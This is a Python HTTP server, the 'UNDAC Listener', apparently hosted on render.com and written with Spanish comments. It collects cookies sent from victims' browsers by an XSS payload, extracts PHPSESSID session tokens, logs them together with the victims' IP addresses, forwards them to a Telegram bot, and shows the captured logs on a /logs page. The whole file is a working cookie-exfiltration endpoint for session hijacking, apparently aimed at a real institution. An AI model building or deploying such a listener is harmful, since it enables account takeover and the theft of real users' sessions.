from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote
import os
from datetime import datetime
import sys
import urllib.request
import urllib.parse
import threading

PORT = int(os.environ.get("PORT", 8000))
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

def send_telegram_message(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    
    def send_async():
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            data = urllib.parse.urlencode({
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message,
                'parse_mode': 'HTML'
            }).encode()
            
            req = urllib.request.Request(url, data=data)
            with urllib.request.urlopen(req, timeout=10) as response:
                response.read()
        except Exception as e:
            pass
    
    thread = threading.Thread(target=send_async)
    thread.daemon = True
    thread.start()

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == "/ping":
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"pong")
            return
        
        query = parse_qs(parsed_path.query)
        c_value = query.get('c', [''])[0]
        
        print(f"\n{'='*80}", file=sys.stderr, flush=True)
        print(f"[{datetime.now()}] Peticion recibida:", file=sys.stderr, flush=True)
        print(f"Path: {self.path}", file=sys.stderr, flush=True)
        
        # PRIMERA FUNCIONALIDAD: Captura desde parámetro 'c' (XSS principal)
        if c_value:
            # Decodificar manualmente
            decoded_cookies = unquote(c_value)
            
            print(f"Cookie recibida (decodificada): {decoded_cookies[:200]}...", file=sys.stderr, flush=True)
            
            try:
                with open('cookies_captured.log', 'a', encoding='utf-8') as f:
                    f.write(f"\n{'='*60}\n")
                    f.write(f"Fecha: {datetime.now()}\n")
                    f.write(f"URL completa: {self.path}\n")
                    f.write(f"Cookie completa: {decoded_cookies}\n")
                    
                    phpsessid = None
                    if 'PHPSESSID' in decoded_cookies:
                        for part in decoded_cookies.split(';'):
                            part = part.strip()
                            if part.startswith('PHPSESSID='):
                                phpsessid = part[10:]
                                f.write(f"PHPSESSID extraida: {phpsessid}\n")
                                print(f"PHPSESSID encontrada: {phpsessid}", file=sys.stderr, flush=True)
                                
                                with open('phpsessid.txt', 'a', encoding='utf-8') as pf:
                                    pf.write(f"{datetime.now()} - {phpsessid}\n")
                                break
                    else:
                        f.write("No se encontro PHPSESSID\n")
                        print("No se encontro PHPSESSID", file=sys.stderr, flush=True)
                
                # Notificación Telegram
                if phpsessid:
                    telegram_msg = f"""
COOKIE CAPTURADA - UNDAC Listener

Fecha: {datetime.now()}
PHPSESSID: {phpsessid}
URL: {self.path[:100]}

IP: {self.client_address[0]}
                    """
                    send_telegram_message(telegram_msg.strip())
                    
            except Exception as e:
                print(f"Error: {e}", file=sys.stderr, flush=True)
        
        # SEGUNDA FUNCIONALIDAD: Captura desde cualquier ruta con cookies en query
        # Esto captura cuando el XSS envía cookies en la URL directamente
        if not c_value and '?' in self.path:
            # Intentar extraer cookies de cualquier parámetro
            try:
                all_params = parse_qs(parsed_path.query)
                for param_name, param_values in all_params.items():
                    if param_values and any(cookie_keyword in param_values[0].upper() for cookie_keyword in ['PHPSESSID', 'SESSION', 'COOKIE']):
                        cookie_data = unquote(param_values[0])
                        
                        print(f"Cookie alternativa encontrada en param {param_name}: {cookie_data[:200]}", file=sys.stderr, flush=True)
                        
                        with open('cookies_alternativas.log', 'a', encoding='utf-8') as f:
                            f.write(f"\n{'='*60}\n")
                            f.write(f"Fecha: {datetime.now()}\n")
                            f.write(f"URL: {self.path}\n")
                            f.write(f"Parametro: {param_name}\n")
                            f.write(f"Valor: {cookie_data}\n")
                        
                        # Extraer PHPSESSID si existe
                        if 'PHPSESSID' in cookie_data:
                            for part in cookie_data.split(';'):
                                part = part.strip()
                                if part.startswith('PHPSESSID='):
                                    phpsessid = part[10:]
                                    with open('phpsessid.txt', 'a', encoding='utf-8') as pf:
                                        pf.write(f"{datetime.now()} - ALT - {phpsessid}\n")
                                    
                                    telegram_msg = f"""
COOKIE ALTERNATIVA CAPTURADA

Fecha: {datetime.now()}
Desde parametro: {param_name}
PHPSESSID: {phpsessid}

IP: {self.client_address[0]}
                                    """
                                    send_telegram_message(telegram_msg.strip())
                                    break
            except:
                pass
        
        # Endpoints web
        if self.path == '/' or self.path == '/status':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html = """<html>
<head><title>UNDAC Listener</title></head>
<body>
<h1>Servidor funcionando</h1>
<p>Esperando cookies...</p>
<p><a href="/logs">Ver logs recientes</a></p>
<p><a href="/test">Probar captura</a></p>
</body></html>"""
            self.wfile.write(html.encode('utf-8'))
            return
        
        if self.path == '/test':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h1>Test OK</h1><p>Servidor funcionando correctamente</p>")
            return
        
        if self.path == '/logs':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            try:
                with open('cookies_captured.log', 'r', encoding='utf-8') as f:
                    logs = f.read()[-5000:]
                html = f"<html><body><h1>Ultimos logs</h1><pre>{logs}</pre></body></html>"
                self.wfile.write(html.encode('utf-8'))
            except:
                self.wfile.write(b"<h1>No hay logs aun</h1>")
            return
        
        # Respuesta para cualquier otra petición (evita errores en el navegador víctima)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        pass

print(f"\n{'='*80}", file=sys.stderr, flush=True)
print(f"Servidor iniciado en puerto {PORT}", file=sys.stderr, flush=True)
print(f"URL: https://listener-koyk.onrender.com", file=sys.stderr, flush=True)
print(f"Telegram: {'SI' if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID else 'NO'}", file=sys.stderr, flush=True)
print(f"Hora: {datetime.now()}", file=sys.stderr, flush=True)
print(f"{'='*80}", file=sys.stderr, flush=True)

if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
    start_msg = f"""
UNDAC Listener Iniciado
Hora: {datetime.now()}
URL: https://listener-koyk.onrender.com
    """
    send_telegram_message(start_msg)

try:
    with open('cookies_captured.log', 'a', encoding='utf-8') as f:
        f.write(f"\n{'#'*80}\n")
        f.write(f"Servidor reiniciado: {datetime.now()}\n")
        f.write(f"{'#'*80}\n")
except:
    pass

with HTTPServer(("", PORT), RequestHandler) as httpd:
    print(f"Esperando cookies...", file=sys.stderr, flush=True)
    httpd.serve_forever()